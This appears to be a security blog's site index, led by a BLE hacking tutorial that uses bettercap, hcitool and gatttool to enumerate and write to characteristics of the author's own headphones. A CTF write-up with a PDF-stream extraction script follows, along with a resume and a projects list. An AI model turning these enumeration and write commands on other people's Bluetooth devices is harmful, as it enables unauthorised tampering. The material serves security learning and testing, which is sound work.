technology, meaning solely short amounts of data are transmitted if and only if it is required. BLE uses the IMA (2.4 GHz) band with 40 channels, where 3 of these are used for advertising.\nCentral and Peripherals #\rAssume we just bought a super cool new Fitness tracker, which also provides an IOS or Android application for our phone. When using the tracker, for example, to measure our heart rate, it communicates directly to the app, which then displays the data. This is a typical example of BLE communication, where the data is sent from one device to another. We typicall call these devices peripheral (sending) and central (receiving). Peripherals (tracker) are mostly small, low-energy devices that can connect to more powerful central devices (phone).\nAdvertising #\rCool, but how do these devices even know about each other\u0026rsquo;s presence?\nGreat questions, I\u0026rsquo;m glad you asked! The magic word here is advertising.\nOur tracker (peripheral) constantly sends out advertising data every X ms (defined by an advertising interval), which a central device can then look out for. If the central device is ready to listen to these packets, it will respond with a scan response request.\nFor our example, the application on our phone will scan for the specific MAC address of our tracker, which was probably programmed within the application itself, and sends a response request back to the tracker when found.\nRegarding the advertising data, different things such as the device name, TX Powerlevel, ID, or services are included.\nHow BLE works #\rLet us now investigate how the BLE Protocol operates, by taking a look at the different layers it consists of. As a whole, the protocol can be broken down into the following layers and sub-protocols:\nGeneric Access Profile (GAP) #\rGAP implements the advertising process we discussed before. It is also responsible for defining devices\u0026rsquo; roles in BLE communication. As for the roles, the following once exists: Broadcaster, Observer, Peripheral, and Central. Depending on the connection type: Broadcast (one-to-many) or Unicast (one-to-one), devices will be assigned one of those. Peripheral and central for unicast, broadcaster, and observer for broadcast.\nGeneric Attribute Protocol (GATT) #\rNow, one of the other very important sub-protocols is GATT. This protocol defines how two BLE devices exchange data with each other. This data exchange is initiated after the advertising process (GAP) has been completed. Now, the core concept of data exchange lies in so-called characteristics and services.\nCharacteristics #\rIn simple words, a characteristic can be thought of as a basic \u0026ldquo;API endpoint\u0026rdquo; (e.g. GET /tracker/heart_rate). It can be accessed and called by devices to either read, write, or listen and notify for any updated data. However, in terms of BLE we often encounter that those \u0026ldquo;API endpoints\u0026rdquo; are not directly translated into something useful such as GET /tracker/heart_rate, but a UUID like AAE28F0071B534ABCF182F...\nMostly, if we see such a UUID we can assume that this is a custom-created characteristic by the manufacturer. At the beginning of a connection, a series of characteristics and the service name are exchanged by the devices. This way the central device can identify the service.\nThe interesting part about BLE is that most devices are configured to accept connections by any device without pairing or bonding first. This allows us to interact with the device and retrieve the services and characteristics. Although, those can be configured to require pairing or bonding as well, but more on that later.\nServices #\rA service is simply a bundle of different characteristics. In the example of our \u0026ldquo;API endpoint\u0026rdquo;, it could be the /tracker/ path that bundles different functionality such as /heart_rate. Commonly, bundling characteristics is done in a logical way, such as we did with the tracker and the corresponding heart rate function.\nHacking BLE #\rPrerequisites #\rHacking protocols like Bluetooth, WiFi, Zigbee, etc. mostly require external hardware to do so. For BLE my recommendation is to get an nRF52840 Dongle for the beginning. It costs around 10-20$ and features multiple protocols, already compiled programs such as a BLE sniffer, and other super useful stuff.\nEnumeration #\rLet us see if the interface we want to use even shows up on our PC by using hci tools. HCI stands for Host Controller Interface and is used between the controller and host layer of the BLE stack.\n❯ hciconfig hci1:\tType: Primary Bus: USB BD Address: 5C:F3:70:XX:XX:XX ACL MTU: 1021:8 SCO MTU: 64:1 UP RUNNING RX bytes:1414 acl:0 sco:0 events:84 errors:0 TX bytes:4689 acl:0 sco:0 commands:69 errors:0 hci0:\tType: Primary Bus: USB BD Address: D8:80:83:XX:XX:XX ACL MTU: 1021:6 SCO MTU: 240:8 UP RUNNING RX bytes:3551738 acl:1126 sco:636 events:436453 errors:2 TX bytes:363080346 acl:422502 sco:362 commands:2761 errors:0 Great, let\u0026rsquo;s do our first quick LE scan to see the devices around us:\n❯ sudo hcitool lescan LE Scan ... 38:18:4C:24:30:3E LE_WH-1000XM3 38:18:4C:XX:XX:XX (unknown) ... Now for this, I will use my headphones (LE_WH-1000XM3) as an example. If you find the desired MAC address of the device you are interested in, we can proceed and enumerate the services and characteristics using bettercap.\n❯ sudo bettercap --eval \u0026#34;ble.recon on\u0026#34; bettercap v2.40.0 (built for linux amd64 with go1.23.5) [type \u0026#39;help\u0026#39; for a list of commands] [01:40:20] [sys.log] [inf] gateway monitor started ... BLE » [01:40:21] [ble.device.new] new BLE device LE_WH-1000XM3 detected as 38:18:4C:24:30:3E (Sony Home Entertainment\u0026amp;Sound Products Inc) -71 dBm. BLE » ble.show ┌─────────┬───────────────────┬───────────────┬────────────────────────────────────────────┬──────────────────────────────────────────────┬─────────┬──────────┐ │ RSSI ▴ │ MAC │ Name │ Vendor │ Flags │ Connect │ Seen │ ├─────────┼───────────────────┼───────────────┼────────────────────────────────────────────┼──────────────────────────────────────────────┼─────────┼──────────┤ │ -74 dBm │ 38:18:4c:24:30:3e │ LE_WH-1000XM3 │ Sony Home Entertainment\u0026amp;Sound Products Inc │ │ ✔ │ 01:41:39 │ Checking the \u0026ldquo;Connect\u0026rdquo; field of the table, we can see that this device allows us to connect without any prior pairing or bonding.\nBLE » ble.enum 38:18:4c:24:30:3e [01:47:26] [sys.log] [inf] ble.recon connecting to 38:18:4c:24:30:3e ... BLE » ┌──────────────┬──────────────────────────────────────┬─────────────────────┬─────────────────────────┐ │ Handles │ Service \u0026gt; Characteristics │ Properties │ Data │ ├──────────────┼──────────────────────────────────────┼─────────────────────┼─────────────────────────┤ │ 0001 -\u0026gt; 0004 │ Generic Attribute (1801) │ │ │ │ 0003 │ Service Changed (2a05) │ INDICATE │ │ │ │ │ │ │ │ 0005 -\u0026gt; 0009 │ Generic Access (1800) │ │ │ │ 0007 │ Device Name (2a00) │ READ │ LE_WH-1000XM3 │ │ 0009 │ Appearance (2a01) │ READ │ Unknown │ │ │ │ │ │ │ 000a -\u0026gt; 0011 │ 69a7f243e52f4443a7f9cb4d053c74d6 │ │ │ │ 000c │ be8692b13b29410d94d350281940553e │ WRITE │ │ │ 000e │ 3f92019dac1d48dc9d9486a0fb507591 │ READ │ │ │ 0011 │ 5bc06a57f84d4086a65a2a238cb39cdb │ READ, WRITE │ insufficient encryption │ │ │ │ │ │ │ 0012 -\u0026gt; 001e │ fe59bfa87fe34a059d9499fadc69faff │ │ │ │ 0014 │ 104c022e48d64dd28737f8ac5489c5d4 │ WRITE │ │ │ 0016 │ 69745240ec294899a2a8cf78fd214303 │ NOTIFY │ │ │ 0019 │ 70efdf0043754a9e912d63522566d947 │ NOTIFY │ │ │ 001c │ eea2e8a089f04985a1e2d91dc4a52632 │ READ │ 02 │ │ 001e │ a79e2bd1d6e44d1e8b4f141d69011cbb │ WRITE │ │ │ │ │ │ │ │ 001f -\u0026gt; 002b │ 91c10d9caaef42bdb6d68a648c19213d │ │ │ │ 0021 │ 99d1064e451746aa8fb46be64dd1a1f1 │ READ, WRITE, NOTIFY │ insufficient encryption │ │ 0024 │ fbe87f6c3f1a44b6b5770bac731f6e85 │ WRITE, NOTIFY │ │ │ 0027 │ 420791c0bff54bd1b957371614031136 │ WRITE, NOTIFY │ │ │ 002a │ e4ef5a4630f94287a3e7643066acb768 │ WRITE, NOTIFY │ │ │ │ │ │ │ │ 002c -\u0026gt; 0031 │ fe03 │ │ │ │ 002e │ f04eb177300543a7ac61a390ddf83076 │ WRITE │ │ │ 0030 │ 2beea05b18794bb48a2f72641f82420b │ READ, NOTIFY │ insufficient encryption │ │ │ │ │ │ │ 0032 -\u0026gt; 0039 │ 5b833e056bc748028e9a723ceca4bd8f │ │ │ │ 0034 │ 5b833c116bc748028e9a723ceca4bd8f │ WRITE │ │ │ 0036 │ 5b833c136bc748028e9a723ceca4bd8f │ NOTIFY │ │ │ 0039 │ 5b833c146bc748028e9a723ceca4bd8f │ READ │ WH-1000XM3 │ │ │ │ │ │ │ 003a -\u0026gt; ffff │ 5b833e066bc748028e9a723ceca4bd8f │ │ │ │ 003c │ 5b833c106bc748028e9a723ceca4bd8f │ WRITE │ │ │ 003e │ 5b833c126bc748028e9a723ceca4bd8f │ NOTIFY │ │ │ │ │ │ │ └──────────────┴──────────────────────────────────────┴─────────────────────┴─────────────────────────┘ Awesome, now let\u0026rsquo;s check the table and what we see.\nThe first line looks like a \u0026ldquo;grouping\u0026rdquo; of the UUIDs below it. Remembering the sections before, those seem to be the services.\n│ 0005 -\u0026gt; 0009 │ Generic Access (1800) │ │ │ │ 0007 │ Device Name (2a00) │ READ │ LE_WH-1000XM3 │ │ 0009 │ Appearance (2a01) │ READ │ Unknown\t│ Below each of the services, we find the individual characteristics, and their properties (READ, WRITE, NOTIFY), as well as the data which bettercap automatically reads and displays for us. Further, we can see the memory location where the data is stored, referred to as handles.\n│ 0005 -\u0026gt; 0009 │ Generic Access (1800) │ │ │ │ 0007 │ Device Name (2a00) │ READ │ LE_WH-1000XM3 │ │ 0009 │ Appearance (2a01) │ READ │ Unknown\t│ Here it is always important to check out that the memory locations are overlapping, meaning there is no gap between memory addresses, e.g. [0001 -\u0026gt; 0004] -\u0026gt; [0005 -\u0026gt; 0009].. and so on. If there were gaps between the handles, this could mean that there are hidden services inside.\nFurther, some of those handles do require some sort of pairing or bonding, indicated by the insufficient encryption.\nNow, if you take a look at the table again, you will see that there are a lot of custom-implemented services and characteristics displaying just a UUID. If we are planning to attack this device, we probably should know what the actual functionality behind each UUID is. For this, we will need to reverse engineer each of those characteristics by e.g. inspecting and experimenting with the traffic in Wireshark. However, this is a whole different topic and not in the scope of this blog article.\nReading and writing data #\rSo for reading data, we already saw that bettercap automatically reads and displays the data out of READ properties. However, we can also try to read data manually from a specific handle if we wish to do so.\n❯ sudo gatttool -b 38:18:4c:24:30:3e --char-read -a 0x0039 | awk -F: \u0026#39;{print $2}\u0026#39; | xxd -r -p;printf \u0026#39;\\n\u0026#39; WH-1000XM3 For writing data to a handle we can do something very similar. However, since we haven\u0026rsquo;t reversed the characteristics, we have to guess which type of data is expected by the device. We can however use the --listen flag, which may return some information via the NOTIFY property within the service.\n# We are trying to write a string, which is rejected ❯ sudo gatttool -b 38:18:4c:24:30:3e --char-write-req -a 0x0034 -n $(echo -n \u0026#34;test\u0026#34; | xxd -ps) --listen Characteristic Write Request failed: Attribute value length is invalid # We are trying to write a simple 0x00 byte, which is allowed ❯ sudo gatttool -b 38:18:4c:24:30:3e --char-write-req -a 0x0034 -n 00 --listen Characteristic value was written successfully Notification handle = 0x0036 value: 01 ❯ sudo gatttool -b 38:18:4c:24:30:3e --char-write-req -a 0x0034 -n 01 --listen Characteristic value was written successfully Notification handle = 0x0036 value: 00 Notify #\rMore details on this topic can be found here\nSometimes, when using --listen, we won’t receive any data from a characteristic \u0026ndash; even though it has the notify property. In these cases, we might need to configure the Client Characteristic Configuration Descriptor (CCCD) so that the server knows we want to receive notifications or indications.\nThe CCCD is a specific type of descriptor that allows a client to subscribe to updates for a characteristic that supports server-initiated operations (i.e., notifications or indications). In our fitness tracker example, the phone can use the CCCD to subscribe to the heart rate measurement characteristic and receive updates automatically, rather than having to poll for the data.\nFor our theoretical example, let’s choose the service with UUID 91c10d9c... that spans handles 0x001f to 0x002b. Assume that the CCCD for the characteristic is located at handle 0x002b (which has the required read and write permissions). We would then execute char-write-req 0x002b 0100 to enable the notifications.\nnRF Connect #\rA way easier way compared to the manual one we saw before is to utilize the power of the nRF Dongle I recommended before. The application offers a lot of different programs, also BLE, that we can directly run with just a click.\nWe get the same results by just clicking on \u0026ldquo;Start scan\u0026rdquo; and the corresponding \u0026ldquo;Connect\u0026rdquo; button. Further, we can also see that the software automatically reads out the data from READ properties if it is able to just like bettercap.\nWriting and notifying is also just as easy as clicking a button or inputting the values. Although the sotware does not automatically decoded the bytes of 57 48 2D.. to WH-1000XM3, which bettercap actually did for us.\n│ 0039 │ 5b833c146bc748028e9a723ceca4bd8f │ READ │ WH-1000XM3 │ Summary #\rIn this article, we delved into the essentials BLE and its inner workings. We began by exploring the fundamental differences between BLE and classic Bluetooth, emphasizing BLE\u0026rsquo;s low-power communication and its unique advertising mechanism. Key BLE components such as GAP and GATT were discussed, highlighting how they define device roles, advertising, and data exchange through services and characteristics.\nWe then transitioned into the practical side of BLE hacking. Using tools like bettercap and gatttool, we demonstrated how to enumerate nearby BLE devices, inspect their available services, and interact with their characteristics \u0026ndash; whether it’s reading, writing, or enabling notifications. The article also covered common challenges such as handling hidden services as well as a brief overview of how modern tools like the nRF Connect suite can simplify these tasks.\nOverall, this guide provides a solid foundation for understanding BLE technology and its vulnerabilities, paving the way for further exploration and security testing in the ever-evolving landscape of IoT and wireless communications.\n","date":"17 February 2025","externalUrl":null,"permalink":"/posts/ble/","section":"Posts","summary":"Overview #\rFeel free to skip to the hacking part directly if you don\u0026rsquo;t care about the basics of BLE","title":"Bluetooth Low Energy Hacking 101","type":"posts"},{"content":"","date":"17 February 2025","externalUrl":null,"permalink":"/ctfs/","section":"Ctfs","summary":"","title":"Ctfs","type":"ctfs"},{"content":" 🏆 123/798 -- 200 points Challange Type Points Finished Fuzzybytes web 50 November 23rd, 6:56:11 PM typstastic misc 50 November 23rd, 5:19:06 AM Rivest–Shamir–Adleman-Germain crypto 50 November 22nd, 9:04:34 PM Welcome welcome 50 November 22nd, 7:02:16 PM Learnings #\rEmbedded PNG files inside PDF stream #\rpeepdf can help to analyze PDF streams\nImHex is a nice hex editor\nWe can see image data (PNG) is compressed into xref_streams Use PyMuPDF library to extract the data\nxref_stream() automatically Locates the stream in the PDF Applies the necessary decompression Removes any encoding Returns the raw binary data xref is just a number\nIt\u0026rsquo;s the index or ID of each object in the PDF\u0026rsquo;s cross-reference table xref // Start of xref table 0 6 // Start at obj 0, contains 6 objects 0000000000 65535 f // Object 0 0000000010 00000 n // Object 1 0000000079 00000 n // Object 2 0000000173 00000 n // Object 3 0000000301 00000 n // Object 4 0000000380 00000 n // Object 5 # In PDF hex dump stream 789C636400.... # This is compressed data endstream # After xref_stream() decoding 89504E470D0A... # Actual PNG data \u0026gt;\u0026gt; endobj 20 0 obj // \u0026lt;---- OBJ ID 20 \u0026lt;\u0026lt;/Length 100\u0026gt;\u0026gt; stream �PNG // \u0026lt;-- PNG starts We can then use this script to target the specific stream where the PNG file is via id 20 and read the raw data from the xref_stream import fitz # PyMuPDF def extract_streams_with_fitz(pdf_path, start_object, output_path): # Open the PDF pdf_document = fitz.open(pdf_path) aggregated_data = b\u0026#34;\u0026#34; # Iterate through all xref objects starting from the specified one for xref in range(start_object, pdf_document.xref_length()): try: # Get the raw stream data stream_data = pdf_document.xref_stream(xref) if stream_data: aggregated_data += stream_data except Exception as e: print(f\u0026#34;Failed to process object {xref}: {e}\u0026#34;) continue with open(output_path, \u0026#34;wb\u0026#34;) as f: f.write(aggregated_data) print(f\u0026#34;Aggregated PNG data saved to {output_path}\u0026#34;) extract_streams_with_fitz(\u0026#34;chall.pdf\u0026#34;, 20, \u0026#34;chall.png\u0026#34;) ","date":"17 February 2025","externalUrl":null,"permalink":"/ctfs/glacier-2024/","section":"Ctfs","summary":"🏆 123/798 -- 200 points Challange Type Points Finished Fuzzybytes web 50 November 23rd, 6:56:11 PM typstastic misc 50 November 23rd, 5:19:06 AM Rivest–Shamir–Adleman-Germain crypto 50 November 22nd, 9:04:34 PM Welcome welcome 50 November 22nd, 7:02:16 PM Learnings #\rEmbedded PNG files inside PDF stream #\rpeepdf can help to analyze PDF streams","title":"Glacier (2024)","type":"ctfs"},{"content":"\rH1 Test #\rasdsa code\nX print(\u0026#34;test\u0026#34;) Month Savings January $250 February $80 March $420 test\nnunocoracao/blowfish\rPersonal Website \u0026amp; Blog Theme for Hugo\rHTML 1693\r459\rWhen life gives you lemons, make lemonade.\rgraph LR; A[Lemons]--\u003eB[Lemonade]; B--\u003eC[Profit] header badge test\rsubheader\rLorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus non magna ex. Donec sollicitudin ut lorem quis lobortis. Nam ac ipsum libero. Sed a ex eget ipsum tincidunt venenatis quis sed nisl. Pellentesque sed urna vel odio consequat tincidunt id ut purus. Nam sollicitudin est sed dui interdum rhoncus. Another Awesome Header date - present\rAwesome Subheader\rWith html code Coffee Tea Milk Shortcodes AWESOME\rWith other shortcodes Another Awesome Header nunocoracao/blowfish\rPersonal Website \u0026amp; Blog Theme for Hugo\rHTML 1693\r459\r1 2 3 4 5 6 7 8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;My Sample Page\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/html\u0026gt; ","date":"29 January 2025","externalUrl":null,"permalink":"/posts/template/","section":"Posts","summary":"H1 Test #\rasdsa code","title":"Template","type":"posts"},{"content":"\rExperience Company Link Role Dates Location Yekta IT Penetration tester Dec 2023 - Today Remote Cure53 Security Intern Apr 2023 - Jun 2023 Remote Education School Link Degree Date Ruhr-Universität-Bochum B.Sc. Ing. - Computer Science 2023 ","date":"13 June 2022","externalUrl":null,"permalink":"/resume/","section":"","summary":"Experience Company Link Role Dates Location Yekta IT Penetration tester Dec 2023 - Today Remote Cure53 Security Intern Apr 2023 - Jun 2023 Remote Education School Link Degree Date Ruhr-Universität-Bochum B.","title":"Resume","type":"page"},{"content":"I build innovative security tools and explore new approaches in cybersecurity research. Each project, whether developing testing frameworks or exploring defense strategies, helps me better understand real-world security challenges and grow in the field.\nTitle Description References Hacktopus Active A Powerful CLI pentest orchestration and managment tool TBD YCarla Active A 3D Car simulator controlled via an XBox controller and CAN messages for our real life car demonstrator project TBD YekCar Active Different PySide6 QML dashboards (Attacker, Defender, Car-Dashboard) using real CAN communication for our real life car demonstrator project AnomalyML\nDone A small ML project which could be deployed to our demonstrator project to detect and alert speed injections TBD YekTrain\nDone A Pyside6 QML dashboard for simulating a 2D train via real protocols for a planned real life project in the future YDashboards Done Moder SOC dashboards written using Python flask for OT-, Train- and Car asset monitoring and alerting YFuzzer\nArchived An intelligent XSS fuzzer written in Python ","date":"13 June 2022","externalUrl":null,"permalink":"/projects/","section":"","summary":"I build innovative security tools and explore new approaches in cybersecurity research.","title":"Projects","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]